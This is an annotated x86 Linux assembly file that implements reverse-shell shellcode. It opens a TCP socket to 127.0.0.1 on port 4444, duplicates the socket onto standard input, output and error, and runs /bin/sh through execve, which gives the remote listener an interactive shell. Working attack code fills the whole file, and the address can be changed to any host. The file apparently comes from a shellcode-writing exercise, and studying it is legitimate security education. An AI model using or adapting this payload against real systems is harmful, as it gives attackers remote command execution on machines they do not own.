global _start

section .text

_start:

	; Create a socket
	; eax = 102 (socketcall), ebx = 1 (socket),
	;   ecx = esp (2 (AF_INET), 1 (SOCK_STREAM), 0)
	mov eax, 102	; syscall = socketcall
	mov ebx, 1	; socket = 1
	push dword 0	; args: protocol = 0
	push dword 1	;       type = (SOCK_STREAM = 1)
	push dword 2	;       domain = (AF_INET = 2)
	mov ecx, esp	; pointer of args
	int 0x80

	; Save the returned socket to edi for later use, this is
	;   the first argument of the following syscalls
	xchg edi, eax	; eax (socket)  <=>  edi

	; Connect to a remote port
	push 0x0100007F	; socaddr: 0x0100007F = 127.0.0.1
	push 0x5c110002	;          0x5c11 = port 4444, AF_INET = 0x0002
	mov ecx, esp

	; eax = 102 (socketcall), ebx = 3 (connect),
	;   ecx = (socket, server struct, 16)
	mov eax, 102	; syscall = socketcall
	mov ebx, 3	    ; connect = 3
	push dword 16	; sockaddr_in: size of sockaddr_in
	push ecx	    ;              pointer of sockaddr_in
	push edi    	;              server socket
	mov ecx, esp	; pointer of args
	int 0x80

	; Duplicate file descriptor
	; eax = 63 (dup2), ebx = old file descriptor (client socket)
	;   ecx = new file descriptor (0 = STDIN / 1 = STDOUT / 2 = STDERR)
	mov eax, 63	    ; syscall = dup2
	mov ebx, edi	; old file descriptor = client socket
	mov ecx, 0	    ; new file descriptor = STDIN
	int 0x80

	mov eax, 63	    ; syscall = dup2
	mov ebx, edi	; old file descriptor = client socket
	mov ecx, 1	    ; new file descriptor = STDOUT
	int 0x80

	mov eax, 63	    ; syscall = dup2
	mov ebx, edi	; old file descriptor = client socket
	mov ecx, 2	    ; new file descriptor = STDERR
	int 0x80


	; execve syscall
	xor eax, eax
	push eax	    ; NULL

	push 0x68732f6e	; hs/n
	push 0x69622f2f	; ib//

	; First argument
	mov ebx, esp	; pointer to '//bin/sh', 0x00

	push eax	    ; NULL
	; Third argument
	mov edx, esp	; pointer to a NULL

	push ebx	    ; pointer to '//bin/sh', 0x00
	; Second argument
	mov ecx, esp	; pointer to the pointer of '//bin/sh', 0x00

	mov al, 11	    ; syscall = execve = 11
	int 0x80

